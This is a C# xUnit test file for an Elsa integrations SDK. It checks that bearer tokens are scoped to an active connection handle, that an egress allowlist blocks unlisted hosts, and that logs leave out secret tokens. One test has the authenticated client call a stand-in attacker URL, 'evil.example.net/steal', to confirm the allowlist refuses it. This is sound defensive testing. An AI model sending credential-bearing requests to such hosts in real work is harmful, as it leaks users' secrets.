using System.Net.Http.Headers;
using Elsa.Activities.Http.Constants;
using Elsa.Integrations.Sdk;
using Elsa.Integrations.Sdk.Connections;
using Elsa.Integrations.Sdk.Harness;
using Elsa.Secrets.Core.Models;
using Microsoft.Extensions.DependencyInjection;

namespace Elsa.Integrations.Tests;

public sealed class AuthenticatedHttpTests
{
    [Fact]
    public async Task Named_client_gets_bearer_auth_only_while_the_handle_is_active()
    {
        await using var harness = ConnectorHarness.Create();
        harness.Connections.Add(BearerSnapshot(harness.TenantId));
        harness.Secrets.Add(harness.TenantId, "demo-token", "tok-secret");

        var factory = harness.Services.GetRequiredService<IHttpClientFactory>();
        var client = factory.CreateClient(HttpActivityConstants.HttpClientName);
        Assert.Equal(HttpActivityConstants.HttpClientName, "Elsa.Activities.Http");

        await client.GetAsync("https://api.example.com/open");
        Assert.Null(harness.Http.LastRequest?.Headers.Authorization);

        await using (var handle = await harness.ConnectionContext.ResolveAsync(new ConnectionReference("demo")))
        {
            await handle.HttpClient.GetAsync("https://api.example.com/private");
            Assert.Equal(new AuthenticationHeaderValue("Bearer", "tok-secret"), harness.Http.LastRequest?.Headers.Authorization);
        }

        await client.GetAsync("https://api.example.com/open-again");
        Assert.Null(harness.Http.LastRequest?.Headers.Authorization);
    }

    [Fact]
    public async Task Egress_allowlist_refuses_other_hosts()
    {
        await using var harness = ConnectorHarness.Create();
        harness.Connections.Add(BearerSnapshot(harness.TenantId) with
        {
            EgressAllowlist = ["api.example.com"]
        });
        harness.Secrets.Add(harness.TenantId, "demo-token", "tok-secret");

        await using var handle = await harness.ConnectionContext.ResolveAsync(new ConnectionReference("demo"));
        var ex = await Assert.ThrowsAsync<ConnectionUnavailableException>(() =>
            handle.HttpClient.GetAsync("https://evil.example.net/steal"));
        Assert.Contains("evil.example.net", ex.Message);
        Assert.False(ex.IsRetryable);
    }

    [Fact]
    public async Task Logs_do_not_contain_authorization_headers()
    {
        await using var harness = ConnectorHarness.Create();
        harness.Connections.Add(BearerSnapshot(harness.TenantId));
        harness.Secrets.Add(harness.TenantId, "demo-token", "tok-secret");

        await using var handle = await harness.ConnectionContext.ResolveAsync(new ConnectionReference("demo"));
        await handle.HttpClient.GetAsync("https://api.example.com/private?token=raw");

        Assert.DoesNotContain(harness.LogMessages, message => message.Contains("tok-secret", StringComparison.Ordinal));
        Assert.DoesNotContain(harness.LogMessages, message => message.Contains("Authorization", StringComparison.OrdinalIgnoreCase)
            && message.Contains("tok-secret", StringComparison.Ordinal));
    }

    private static ConnectionSnapshot BearerSnapshot(string tenantId) => new()
    {
        TenantId = tenantId,
        Name = "demo",
        TypeName = "http",
        AuthScheme = ConnectionAuthSchemes.Bearer,
        SecretFields = new Dictionary<string, SecretReference>(StringComparer.Ordinal)
        {
            ["accessToken"] = new("demo-token")
        }
    };
}
